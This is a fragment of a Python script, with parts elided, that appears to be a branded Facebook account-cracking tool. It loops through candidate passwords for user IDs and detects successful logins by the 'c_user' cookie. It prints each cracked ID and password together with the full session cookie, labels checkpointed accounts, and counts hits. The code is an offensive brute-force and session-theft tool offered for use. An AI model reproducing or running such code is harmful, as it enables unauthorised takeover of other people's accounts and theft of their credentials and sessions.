...
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS MAFUZ BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[MAFUZ-OK😘] {uid}|{ps}")
                print(f"\n[COOKIE🙈] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[MAFUZ-CP🤣] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[MAFUZ-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
